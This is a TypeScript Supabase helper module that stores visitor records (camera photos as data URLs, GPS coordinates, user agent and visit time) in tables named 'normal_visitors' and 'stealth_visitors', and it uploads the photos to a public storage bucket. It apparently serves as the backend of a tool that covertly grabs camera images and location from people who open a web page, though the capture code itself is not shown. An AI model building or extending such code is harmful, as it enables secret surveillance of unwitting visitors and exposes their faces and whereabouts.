import { createClient } from '@supabase/supabase-js';

const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;

if (!supabaseUrl || !supabaseAnonKey) {
  console.error('❌ Supabase URL أو ANON KEY غير موجود في متغيرات البيئة');
}

export const supabase = createClient(supabaseUrl, supabaseAnonKey);

// Database Tables
export const TABLES = {
  NORMAL_VISITORS: 'normal_visitors',
  STEALTH_VISITORS: 'stealth_visitors'
};

// Test Supabase connection
export const testSupabaseConnection = async () => {
  try {
    console.log('🚀 Testing Supabase connection...');
    const { data, error } = await supabase.from('normal_visitors').select('count', { count: 'exact', head: true });
    
    if (error) {
      console.error('❌ Supabase connection failed:', error);
      return false;
    }
    
    console.log('✅ Supabase connection successful!');
    return true;
  } catch (error) {
    console.error('❌ Supabase connection error:', error);
    return false;
  }
};

// Helper functions for Supabase operations
export const supabaseHelpers = {
  // Parse PostGIS POINT to our location format
  parseLocation(pointString: string) {
    // Handle both PostGIS POINT format and regular lat/lng object
    if (typeof pointString === 'string') {
      // Parse "POINT(longitude latitude)" format
      const match = pointString.match(/POINT\(([^)]+)\)/);
      if (match) {
        const [longitude, latitude] = match[1].split(' ').map(Number);
        return {
          latitude,
          longitude,
          accuracy: 0,
          timestamp: new Date()
        };
      }
    } else if (pointString && typeof pointString === 'object') {
      // Handle direct lat/lng object
      return {
        latitude: pointString.latitude || 0,
        longitude: pointString.longitude || 0,
        accuracy: pointString.accuracy || 0,
        timestamp: new Date()
      };
    }
    return null;
  },

  // Add a visitor record
  async addVisitor(tableName: string, visitorData: any) {
    try {
      console.log(`📝 Adding visitor to ${tableName}...`, {
        id: visitorData.id,
        photosCount: visitorData.photos.length,
        hasLocation: !!visitorData.location
      });
      
      // Convert photos to base64 strings for storage
      const photosData = visitorData.photos.map((photo: any) => ({
        id: photo.id,
        dataUrl: photo.dataUrl,
        timestamp: photo.timestamp.toISOString()
      }));

      // Prepare the record for Supabase
      const record: any = {
        photos: photosData,
        visit_time: visitorData.visitTime.toISOString(),
        user_agent: visitorData.userAgent
      };

      // Handle location data - simplified approach
      if (visitorData.location) {
        record.location = `POINT(${visitorData.location.longitude} ${visitorData.location.latitude})`;
        record.accuracy = visitorData.location.accuracy || null;
      } else {
        record.location = null;
        record.accuracy = null;
      }

      console.log('📤 Sending to Supabase:', {
        tableName,
        photosCount: record.photos.length,
        hasLocation: !!record.location,
        visitTime: record.visit_time
      });

      const { data, error } = await supabase
        .from(tableName)
        .insert([record])
        .select();

      if (error) {
        console.error('❌ Supabase insert error:', error);
        throw error;
      }

      if (!data || data.length === 0) {
        throw new Error('No data returned from insert');
      }

      console.log('✅ Visitor added successfully to Supabase:', data[0].id);
      return data[0].id;
    } catch (error) {
      console.error('❌ Error in addVisitor:', error);
      // Return a more detailed error
      throw new Error(`Failed to add visitor: ${error.message}`);
    }
  },

  // Get all visitors from a table
  async getVisitors(tableName: string) {
    try {
      console.log(`📖 Getting visitors from ${tableName}...`);
      
      const { data, error } = await supabase
        .from(tableName)
        .select('*')
        .order('visit_time', { ascending: false });

      if (error) {
        console.error('❌ Error getting visitors from Supabase:', error);
        throw error;
      }

      if (!data) {
        console.log(`📊 No data found in ${tableName}`);
        return [];
      }

      // Convert data back to our format
      const visitors = data.map(record => ({
        id: record.id,
        photos: record.photos.map((photo: any) => ({
          id: photo.id,
          dataUrl: photo.dataUrl,
          timestamp: new Date(photo.timestamp)
        })),
        location: record.location ? this.parseLocation(record.location) : null,
        visitTime: new Date(record.visit_time),
        userAgent: record.user_agent
      }));

      console.log(`✅ Retrieved ${visitors.length} visitors from ${tableName}`);
      return visitors;
    } catch (error) {
      console.error('❌ Error in getVisitors:', error);
      return [];
    }
  },

  // Delete all visitors from a table
  async deleteAllVisitors(tableName: string) {
    try {
      console.log(`🗑️ Deleting all visitors from ${tableName}...`);
      
      const { error } = await supabase
        .from(tableName)
        .delete()
        .neq('id', 'impossible_id'); // This will delete all records
      
      if (error) {
        console.error('❌ Error deleting visitors from Supabase:', error);
        throw error;
      }
      
      console.log(`✅ All visitors deleted from ${tableName}`);
    } catch (error) {
      console.error('❌ Error in deleteAllVisitors:', error);
      throw error;
    }
  },

  // Upload photo to Supabase Storage
  async uploadPhoto(photo: any, visitorId: string) {
    try {
      const fileName = `${visitorId}/${photo.id}.jpg`;
      
      // Convert base64 to blob
      const response = await fetch(photo.dataUrl);
      const blob = await response.blob();

      const { data, error } = await supabase.storage
        .from('visitor-photos')
        .upload(fileName, blob, {
          contentType: 'image/jpeg',
          upsert: true
        });

      if (error) {
        console.error('❌ Error uploading photo:', error);
        return null;
      }

      // Get public URL
      const { data: urlData } = supabase.storage
        .from('visitor-photos')
        .getPublicUrl(fileName);

      return urlData.publicUrl;
    } catch (error) {
      console.error('❌ Error in uploadPhoto:', error);
      return null;
    }
  }
};

// Initialize connection test on module load
if (typeof window !== 'undefined') {
  testSupabaseConnection();
}